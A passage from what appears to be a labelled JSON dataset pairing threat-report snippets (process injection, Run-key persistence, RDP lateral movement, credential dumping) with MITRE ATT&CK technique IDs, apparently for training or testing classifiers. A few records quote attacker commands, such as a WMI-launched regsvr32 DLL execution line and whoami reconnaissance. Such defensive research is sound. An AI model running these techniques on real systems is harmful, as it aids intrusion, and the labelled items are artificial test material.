    "text": "has collected the operating system version from the infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has relied upon a user opening an ISO file to enable execution of malicious shortcut files and DLLs.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Cybereason Bumblebee August 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "malware creates the persistence via Registry Run Keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a file in AppData\\Local\\Microsoft\\Windows\\Explorer and stores all harvested data in that file.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor accessing the wiki as users who would be considered “non-privileged”",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "attempts to get users to launch malicious attachments delivered via spearphishing emails.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can use multiple Native APIs.(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "GetExtendedTcpTable to retrieve a list of TCP endpoints\nGetIpNetTable to retrieve",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "store\na file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\ directory",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "used a batch script to gather folder and file names from victim hosts.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can perform process injection by using a reflective DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the computer name and the domain of infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive.(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has stored keystrokes and screenshots within the %temp%\\GoogleChrome %temp%\\Downloads and %temp%\\TrendMicroUpdate directories.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "downloaded several staged items onto the victim's machine. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Retrieve process list and process information by running 'SELECT * FROM Win32_Process'",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Used to search for the string \"DBPath\" in all files within the current directory and its subdirectories",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "obtains a list of running processes using the function kill_unwanted.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "USBS Deletes the file created by the USB command to reverse the effect",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware and files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "examples of the command line syntax used for the performance of this activity",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to deliver a payload to a remote host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can run commands on the compromised asset with CMD functions.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "enables remote interaction and can obtain additional code over HTTPS GET and POST requests.(Citation: FireEye Fin8 May 2016)(Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged embedded shellcode to inject a downloader into the memory of Word.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "performed process hollowing through the API calls CreateRemoteThread ResumeThread and Wow64SetThreadContext.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry subkey that registers a new service.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "examples of command lines",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can deploy additional tools onto an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can create a link to itself in the Startup folder to automatically start itself upon system restart.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "making a HTTP GET request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "looks for processes from a hard-coded list.(Citation: Dragos EKANS)(Citation: FireEye Ransomware Feb 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the processes used for injection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "injecting it into an svchost.exe process,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to obtain a list of all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.(Citation: US-CERT Volgmer 2 Nov 2017)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can discover processes on compromised hosts.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has enabled Wdigest by changing the registry value from 0 to 1.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "attempted to use RDP to move laterally.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "wmic /node",
    "command": "",
    "labels": [
      "T1047",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can use winapiexec tool for indirect execution of ShellExecuteW and CreateProcessA.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Process injections in svchost process via CreateRemoteThread, Default named pipes, etc",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to run a PowerShell script. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "then determines the processor architecture",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can gather information about the victim proxy server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can delete the original executable after initial installation in addition to unused functions.(Citation: Objective See Green Lambert for OSX Oct 2021) ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to disable Windows Defender through modification of the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has collected information from a compromised host. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the actors used RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can copy files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP requests for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can lower security settings by changing Registry keys.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "malware that communicates over the MQTT protocol.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\\Windows\\system32\\cmd.exe /C adcomp.bat which contained the PowerShell command:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "via a Windows batch script file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used for function imports (via GetProcAddress)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve system information including OS version memory usage local hostname and system adapter information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "attacker disabling Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "use process hollowing to inject decrypted payload into child process and resolves its Import Address Table.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": " tasklist ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has injected an install module into a newly created process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "used cmd.exe /c to execute commands on remote machines.(Citation: FireEye APT41 Aug 2019) used a batch file to install persistence for the  BEACON loader.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee Lazarus Jul 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to maintain RDP backdoors.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "collects the OS version system architecture computer name product ID install date and information on the keyboard mapping to determine the language used on the system.(Citation: Talos Zeus Panda Nov 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "dropping and the execution of several payloads using multiple techniques",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has run the whoami command and has a built-in command to identify the user logged in. ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe in a Registry value added to establish persistence.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Enumerates running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "enumerate running processes and send a list of process names and IDs back to the C2",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can query `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid` to retrieve the machine GUID.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "accessible through API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "cyber actors have been observed using multiple implants with file system enumeration and traversal capabilities.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can upload files to C2 from victim machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "using the command line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "command and control occurs via HTTPS over port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has accessed Registry hives ntuser.dat and UserClass.dat.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use various Windows API functions to perform tasks.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe for execution.(Citation: Security Intelligence More Eggs Aug 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "drops suspicious files on the attacked servers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to run commands on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used compromised VPN accounts to gain access to victim systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This enables the document to fetch the .dotm file from the remote server required for further actions",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used tasklist to enumerate processes and find a specific string.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create scheduled tasks for persistence.(Citation: Trend Micro Qakbot May 2020)(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021)(Citation: Kaspersky QakBot September 2021)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Lots of custom scripts dropped by threat actors",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has several commands to search directories for files.(Citation: Cybereason Oceanlotus May 2017)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "configuring autorun entries,",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files.(Citation: ESET RTM Feb 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communications.(Citation: ClearSky MuddyWater June 2019)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the command line and rundll32.exe to execute.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.(Citation: Unit 42 Sofacy Feb 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "then starts a suspended process to perform injection on it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download and launch additional payloads.(Citation: Talos Cobalt Group July 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect files from local drives.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "collect and upload information about the device",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.(Citation: Volexity Patchwork June 2018)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "passed as an argument on the\ncommand line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "RDP traffic",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to gather various local system information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Additional data is gleaned via WMI queries",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has locally staged encrypted archives for later exfiltration efforts.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": ". The malware will try first to write in the registry-hive “HKEY_LOCAL_MACHINE” but if it cannot create it, it will use the registry-hive “HKEY_CURRENT_USER”:",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The CMD file contains commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to deliver a payload to a remote host.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "shows that the directory listing function",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "used compromised credentials to log on to other systems.(Citation: FireEye APT41 Aug 2019)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "uses both regular and reflective DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware also spawns cmd.exe to execute the following command",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can identify the domain of the compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)(Citation: Symantec Chafer February 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "is capable of deleting the backdoor file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of processes running on the system.(Citation: Unit42 Cannon Nov 2018)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has gathered a recursive directory listing to find files and directories of interest.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The ConsentPromptBehaviorAdmin key has been set to “0”, indicating that the behavior of the consent prompt for actions requiring administrator privileges has been modified",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "systems injected the Conti DLL into memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "malware has injected a Cobalt Strike beacon into Rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses WMI to query the Windows Registry.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can dump credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "identifies files with certain extensions and copies them to a directory in the user's profile.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has called cmd through a Word document macro.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can send process listings over the C2 channel.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "configures itself as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can enable remote desktop on the victim's machine.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to start an interactive shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate drives on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has checked for the Google Updater process to ensure  was loaded properly.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate `Uninstall` registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "a malicious actor was observed signing in to a Microsoft 365 account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "after a user opened an Excel document and enabled macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon clicking the Open button, it drops the HTA file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a function to delete files from the victims machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "modifies several registry keys for persistence and UAC bypass.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "persists using a scheduled task that executes every minute.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from compromised machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "several files were staged for possible, but unconfirmed exfiltration",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address and NetBIOS name of an infected machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Copy down batch scriptsExecute batch scripts",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "browses a directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "batch files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "An  downloader uses the Windows command cmd.exe /C whoami to verify that it is running with the elevated privileges of System.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "was to start a program as a service",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download additional plug-ins to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used Ngrok to proxy RDP connections and to perform command and control.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can search through connected file systems and obtain directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP to log in and move laterally in the target environment.(Citation: CISA AA20-259A Iran-Based Actor September 2020)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "backdoor possesses the capability to list files and directories on a machine. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Gathering system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "executes a Python script to download its second stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can record the IP address of the target machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can load any files onto the infected machine to execute.(Citation: TrendMicro DarkComet Sept 2014)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it download and execute yet another Python script",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to create a new process on a remote machine via `C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll`.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim username and encrypts the information to send over its C2 channel.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A  tool can use WMI to execute a binary.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "collects files with the following extensions: .ppt .pptx .pdf .doc .docx .xls .xlsx .docm .rtf .inp .xlsm .csv .odt .pps .vcf and sends them back to the C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve file listings from the victim machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can obtain proxy information from a victim's machine using system environment variables.(Citation: Objective See Green Lambert for OSX Oct 2021) ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather the IP address from an infected host. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Collection of information about the system in HTML format",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from a victim's machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has gathered all of the running system processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "threat actor injected into a dllhost.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can run whoami to identify the system owner.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can inject code through calling VirtualAllocExNuma.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Various implementations of  communicate with C2 over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used to dump information from the victim’s Oracle database.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "removes all files in the /tmp directory.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a function to call the OpenClipboard wrapper. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "A user had to click on this in order to execute the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor’s RDP session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of starting a process using CreateProcess.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "an information stealer used to harvest internal information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has collected large numbers of files from compromised network systems for later extraction.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP for lateral movement.(Citation: CrowdStrike Grim Spider May 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve network information from a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
